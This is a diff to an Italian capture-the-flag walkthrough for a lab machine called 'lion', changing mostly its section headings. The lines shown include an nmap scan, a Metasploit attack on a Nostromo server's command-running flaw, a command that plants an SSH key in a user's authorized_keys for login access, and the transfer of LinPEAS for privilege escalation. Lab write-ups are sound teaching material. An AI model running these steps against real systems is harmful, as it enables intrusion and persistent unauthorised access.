@@ -1,6 +1,6 @@
 # lion
-# ENUM
-partiamo con uno scan 
+## ENUMERAZIONE
+partiamo con uno scan delle porte e dei servizi che ci girano sopra.
 
 ```bash
 nmap lion.thm -sV -sC 
@@ -11,7 +11,7 @@ troviamo 2 porte interessanti la porta 8080 e la 1337
 avete più possibilità io ho individuato 2 problemi principali di questa web app 
 principalmente nostromo usa un paramentro http_verify che permette all'attacante di inviare comandi 
 in questo caso vi consiglio di avviare metasploit
-# exploitation
+## EXPLOITATION
 ```bash
 msfconsole
 ```
@@ -47,14 +47,14 @@ mkdir /home/gloria/.ssh; echo '<il file sshkey.pub>' > /home/gloria/.ssh/authori
 
 tramite l'sshkey generata e salvata sulla nostra macchina facciamo la connessione in ssh
 
-## ssh
+## SSH
 
 ```bash
 ssh -i sshkey gloria@<lion.thm> -p 1337
 ```
 ottimo siamo sull'ssh andiamo a fare il privesc
 
-## privesc
+## privilege escalation
 
 scarichiamo LinPEAS.sh sulla nostra macchina e passiamolo sulla macchina attaccata
 
